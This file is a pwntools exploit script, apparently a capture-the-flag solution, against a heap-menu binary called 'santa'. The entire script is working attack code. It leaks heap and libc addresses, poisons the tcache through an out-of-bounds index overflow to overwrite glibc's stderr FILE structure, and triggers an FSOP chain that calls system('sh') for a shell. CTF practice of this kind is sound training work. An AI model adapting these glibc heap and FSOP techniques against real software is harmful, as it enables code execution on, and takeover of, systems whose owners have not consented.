from pwn import *

context.terminal = ["tmux", "splitw", '-h']
context.binary = elf = ELF("./santa")
libc = ELF("./libc.so.6")

def add(idx, size, buf):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", str(size).encode())
    p.sendlineafter(b"> ", buf)

def remove(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

def view(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())
    p.recvuntil(b"All I want for Christmas is\n")
    return p.recvuntil(b"\n1. Add", drop=True)

p = process('./santa')

# leak heap address
add(0, 1, b"A")
remove(0)
add(0, 0, b"")
heap_base = unpack(view(0), "all") << 12
log.info(f"leek @ {hex(heap_base)}")
remove(0)  # cleanup

# put a glibc address onto the heap
add(0, 0x10, b"pad")
add(1, 0x1000, b"A")
add(2, 0x10, b"pad")
remove(1)

# leak glibc
add(3, 0x0, b"")
add(4, 0x0, b"")
libc.address = unpack(view(4), "all") - 0x219ce0
log.info(f"libc base @ {hex(libc.address)}")

# tcache unlink to stderr
add(5, 0x10, b"pad")
add(6, 0xf0, b"overflow")
add(7, 0xf0, b"overwrite me")
add(8, 0xf0, b"xd")
remove(8)
remove(7)
remove(6)
add(-1, 0xf0, b"A"*0xf8 + p64(0x101) + p64(((heap_base + 0x420) >> 12) ^ libc.sym._IO_2_1_stderr_)) 

# one_gadget fsop to shell
standard_FILE_addr = libc.sym._IO_2_1_stderr_
fs = FileStructure()
fs.flags = unpack(b"  " + b"sh".ljust(6, b"\x00"), 64)  # "  sh"
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

# overwrite stderr file structure in glibc
add(8, 0xf0, b"pad")
add(7, 0xf0, bytes(fs))

# exit to trigger fsop chain to get shell
p.sendline(b"4")

p.interactive()
